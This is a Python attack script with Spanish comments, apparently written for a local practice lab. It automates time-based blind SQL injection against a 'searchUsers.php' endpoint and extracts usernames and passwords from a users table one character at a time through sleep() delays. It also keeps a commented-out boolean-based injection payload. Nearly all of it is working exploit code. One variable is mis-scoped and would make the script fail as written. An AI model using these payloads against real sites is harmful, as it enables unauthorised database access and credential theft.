#!/usr/bin/env python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
  print("\n\n[!] Saliendo...\n")
  sys.exit(1)

# Variables globales
mainUrl = "http://localhost/searchUsers.php"
characters = string.printable

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

p1 = log.progress("Fuerza bruta")
p1.status("Iniciando proceso de fuerza bruta")

time.sleep(2)

p2 = log.progress("Datos extraídos")

extractedInfo = ""

# Boolean blind based
# sqliUrl = mainUrl + f"?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),{position},1)) from users where id = 1)={character})"

def makeSQLI():
  for position in range(1, 50):
    for character in range(33, 126):
      # Time based blind
      sqliUrl = mainUrl + f"?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),{position},1))={character},sleep(0.35),1)"

      p1.status(sqliUrl)

      timeStart = time.time()

      response = requests.get(sqliUrl)

      timeEnd = time.time()

      if timeEnd - timeStart > 0.35:
        extractedInfo += chr(character)
        p2.status(extractedInfo)
        break

if __name__ == '__main__':
  makeSQLI()
